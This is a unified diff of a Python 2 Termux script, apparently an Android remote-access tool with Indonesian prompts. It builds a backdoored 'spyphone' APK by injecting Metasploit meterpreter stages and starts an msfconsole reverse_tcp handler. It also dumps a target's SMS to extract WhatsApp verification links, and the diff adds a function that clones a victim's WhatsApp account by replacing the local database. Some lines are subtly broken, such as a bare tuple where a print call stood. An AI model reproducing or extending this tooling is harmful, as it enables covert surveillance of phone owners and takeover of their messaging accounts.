@@ -1,4 +1,3 @@
-#!/usr/bin/python2
 # -*- coding: utf-8 -*-
 
 import os, sys
@@ -41,7 +40,7 @@ else :
     print '' 
     print 'buat akun portmap.io dulu'
     print '' 
-    os.system('xdg-open https://portmap.io')
+    os.system('termux-open https://portmap.io')
     time.sleep(1)
     exit()
   else :
@@ -61,7 +60,7 @@ else :
 			os.system('clear')
 			print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
 			time.sleep(2)
-			#os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
+			os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
 		else :
 			os.system('clear')
 			print 'Konfirmasi Salah!'
@@ -109,7 +108,7 @@ def spyphone_V14():
 	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/")
 	os.system("cd Malware && apktool b spyphone -o spyphone_V14.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
-	#os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 	os.system('mv -f Malware/spyphone_V14.apk /storage/emulated/0/')
 
 def spyphone():
@@ -123,7 +122,7 @@ def spyphone():
 	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/metasploit/")
 	os.system("cd Malware && apktool b spyphone -o spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
-	#os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 	os.system('mv -f Malware/spyphone.apk /storage/emulated/0/')
 		
 def extract_wa():
@@ -138,18 +137,13 @@ def extract_wa():
 	flush(merah+'[!]'+hijau+' pastikan Backdoor') 
 	flush('    dan OpenVPN telah aktif')
 	flush(merah+'[!]'+hijau+' Ambil Kode Verifikasi Target')
-	flush('    Dan database target')
-	flush(merah+'[!]'+hijau+' Gunakan Command')
-	print cyan
-	flush('    dump_sms	')
-	flush('    download {database}')
 	nxt()
 	flush(hijau+'Membuka Msfconsole ... ')
+	time.sleep(3)
 	remote()
 	logo()
 	flush(putih+'Buka link Verifikasi')
 	flush('Untuk Meretas akun Target')
-	flush('Jika link tidak Muncul, ulangi dump_sms')
 	print putih+'---------------------------------------------------'
 	print cyan
 	os.system('cat *txt | grep -o [a-z.]*/[0-9][0-9][0-9][0-9][0-9][0-9] > link.txt')
@@ -166,32 +160,54 @@ def extract_wa():
 		g.close
 		os.system('cat y.txt')
 	f.close
-	nxt()
-	print putih
-	flush('Setelah berhasil meretas akun target')
-	flush('lakukan backup GbWhatsApp')
-	flush('untuk mendapatkan key')
-	nxt()
-	dstb = '/storage/emulated/0/WhatsApp/Databases/'
-	dstd = '/storage/emulated/0/BackupTextForWhatsApp/' 
-	flush('Sedang melakukan Backup')
-	time.sleep(1)
-	os.system('cp '+dstb+'*crypt12 '+dstd) 
-	flush('Database lama telah tersimpan')
-	os.system('cp link.txt '+dstd)
-	time.sleep(1)
-	flush('extract database....')
-	time.sleep(1)
-	os.system('mv -f msgstore.db.crypt12 '+dstb+'&&mv -f key '+dstd)
-	time.sleep(1)
-	flush('key tool saved in storage')
-	time.sleep(1)
-	flush('cleaning..')
-	time.sleep(1)
-	os.system('rm -rf *txt')
+	flush('Jika link tidak Muncul, ulangi dump_sms')
+	#dstb = '/storage/emulated/0/WhatsApp/Databases/'
+	#dstd = '/storage/emulated/0/BackupTextForWhatsApp/' 
+	#flush('Sedang melakukan Backup')
+	#time.sleep(1)
+	#os.system('cp '+dstb+'*crypt12 '+dstd) 
+	#flush('Database lama telah tersimpan')
+	#os.system('cp link.txt '+dstd)
+	#time.sleep(1)
+	#flush('extract database....')
+	#time.sleep(1)
+	#os.system('mv -f msgstore.db.crypt12 '+dstb+'&&mv -f key '+dstd)
+	#time.sleep(1)
+	#flush('key tool saved in storage')
+	#time.sleep(1)
+	#flush('cleaning..')
+	#time.sleep(1)
+	#os.system('rm -rf *txt')
 	#os.system('am start --user 0 -n com.smeiti.wstotext/com.smeiti.wstotext.WStoTextActivity')
 	back()
 
+def clone():
+	os.system('clear')
+	logo()
+	time.sleep(1)
+	print hijau
+	flush(merah+'[!]'+hijau+' Anda akan memasuki mode meterpreter')
+	flush(merah+'[!]'+hijau+' pastikan Backdoor dan OpenVPN telah aktif')
+	nxt()
+	flush(hijau+'Membuka Msfconsole ... ')
+	remote()
+	logo()
+	dsto = '/storage/emulated/0/WhatsApp'
+	dstb = '/storage/emulated/0'
+	flush('Sedang melakukan Backup')
+	time.sleep(1)
+	os.system('cd '+dstb+' && zip -r backup_msfgaf.zip WhatsApp') 
+	flush('Database lama telah tersimpan ')
+	time.sleep(1)
+	flush('Mengganti Database.. ')
+	os.system('rm -rf '+dsto)
+	os.system('mv db ' +dstb+'/WhatsApp')
+	flush('cleaning..')
+	time.sleep(1)
+	os.system('rm -rf *txt WhatsApp')
+	#os.system('am start --user 0 -n com.smeiti.wstotext/com.smeiti.wstotext.WStoTextActivity')
+	back()
+	
 def awal():
 	malware()
 	pilmal()
@@ -232,7 +248,7 @@ def malware():
 
 def logo():      
 	f = open('Baner/asci')
-	print colored(f.read(),'yellow')
+	(f.read(),'yellow')
 	f.close
 	print '---------------------------------------------------'
 	print cyan+' Author  : '+green+'Gafar Risky {PyRAT-svg}   '
@@ -242,7 +258,7 @@ def logo():
 	print ''
 
 def remote():
-    os.system("clear")    	
+    os.system("clear") 	
     logo()
     os.system('rm -rf ip.txt')
     os.system('ifconfig > ip.txt')
@@ -273,7 +289,7 @@ def remote():
       remote()
     else :
       os.system("clear")
-      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
+      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit=dump_sms;sessions -k 1-10'");
       raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
       os.system('clear')
 
@@ -312,7 +328,7 @@ def baru():
     time.sleep(4)
     os.system('mv '+str(name)+'.apk /storage/emulated/0/')
     time.sleep(4)
-    #os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
     home()
 
@@ -320,13 +336,14 @@ def menu():
     os.system('clear')
     time.sleep(1)
     logo()
-    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor '
+    print '\x1b[1;91m1.\x1b[1;97mInject Bacdoor '
     print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
-    print '\x1b[1;91m3.\x1b[1;97mEsekusi'
-    print '\x1b[1;91m4.\x1b[1;97mSadap'+cyan+' *New'
-    print '\x1b[1;91m5.\x1b[1;97mUpdate--'
-    print '\x1b[1;91m6.\x1b[1;97mExit'
-    print '\r\x1b[1;91m__________________________________________«» '
+    print '\x1b[1;91m3.\x1b[1;97mRemote Android '
+    print '\x1b[1;91m4.\x1b[1;97mHack Akun Wa'
+    print '\x1b[1;91m5.\x1b[1;97mClone Akun Wa'
+    print '\x1b[1;91m6.\x1b[1;97mUpdate--'
+    print '\x1b[1;91m7.\x1b[1;97mExit'
+    print '\r\x1b[1;91m______________________________« Pilih MENU » '
 
 def pilih():
     zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
@@ -344,21 +361,22 @@ def pilih():
             else:
               if zedd == '3':
                 remote()
-                home()
               else:
 				  if zedd == '4':
 					extract_wa()
-				  else:	
+				  else:
 					 if zedd == '5':
-					   update()
+						clone()
 					 else:
-					   print 'ok'
-					   if zedd == '6':
-					     exit()
-					   else:
-					     print '\x1b[1;91m[!] Pilih 1-6'
-					     os.system('clear')
-					     home()
+						if zedd == '6':
+							update()
+						else:
+							if zedd == '7':
+								out()
+							else:
+								print '\x1b[1;91m[!] Pilih 1-6'
+								os.system('clear')
+								home()
 
 def home():
 	menu()
